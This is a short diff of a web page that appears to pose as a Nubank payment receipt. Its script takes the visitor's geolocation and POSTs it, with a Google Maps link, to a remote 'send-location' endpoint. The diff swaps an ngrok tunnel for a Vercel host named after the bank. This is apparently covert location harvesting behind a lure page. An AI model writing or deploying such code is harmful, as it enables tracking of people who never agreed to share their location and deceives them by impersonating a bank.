@@ -14,6 +14,8 @@
 <body style="background-color: #6B02A3">
 
   <h1>Teste</h1>
+  <p id="data-atual"></p>  <!-- Aqui vai aparecer a data atual -->
+
 
   <script>
     window.addEventListener("load", () => {
@@ -40,7 +42,7 @@
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      fetch("https://268f-2804-6950-a-39f1-9cc6-68e5-b196-3d38.ngrok-free.app/send-location", {
+      fetch("https://comprovantenubank-nunegocios-2iy0chqoj-peterabenzas-projects.vercel.app/api/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
